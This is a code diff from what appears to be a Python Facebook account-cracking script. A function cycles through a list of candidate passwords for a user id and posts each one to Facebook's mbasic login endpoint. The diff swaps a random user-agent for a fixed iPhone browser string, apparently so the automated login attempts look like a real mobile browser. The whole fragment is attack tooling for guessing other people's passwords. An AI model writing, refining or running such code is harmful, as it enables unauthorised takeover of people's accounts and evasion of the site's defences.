@@ -512,6 +512,7 @@ def gxds_files(uid, pxss):
     session = requests.Session()
     try:
         for ps in pxss:
+            uagent = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/290.1.581873948 Mobile/15E148 Safari/604.1"
             qwerty = random.choice(ugen)
             gxdsfbs = session.get("https://mbasic.facebook.com").text
             fb = "mbasic"
@@ -548,7 +549,7 @@ def gxds_files(uid, pxss):
                 "priority": "u=1",
                 "cross-origin-resource-policy": "cross-origin",
                 "upgrade-insecure-requests": "1",
-                "user-agent": qwerty,
+                "user-agent": uagent,
             }
             session.post(
                 url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
